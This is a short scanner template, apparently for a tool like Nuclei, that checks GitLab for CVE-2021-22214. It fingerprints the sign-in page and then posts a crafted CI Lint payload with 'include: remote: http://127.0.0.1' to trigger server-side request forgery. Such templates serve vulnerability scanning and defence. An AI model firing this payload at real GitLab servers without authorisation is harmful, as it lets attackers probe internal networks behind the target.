id: CVE-2021-22214
name: "GitLab SSRF via CI Lint API"
severity: high
description: "GitLab CE/EE allows SSRF via the CI Lint API endpoint when sending crafted YAML payloads."
reference: CWE-918
confidence: tentative
requests:
  - method: GET
    path: "/users/sign_in"
    matchers:
      - type: body
        words:
          - "GitLab"
          - "sign_in"
      - type: status
        status: [200]
    condition: and
  - method: POST
    path: "/api/v4/ci/lint"
    headers:
      Content-Type: "application/json"
    body: '{"content":"include:\\n  remote: http://127.0.0.1"}'
    matchers:
      - type: body
        words:
          - "valid"
          - "status"
      - type: status
        status: [200]
    condition: and
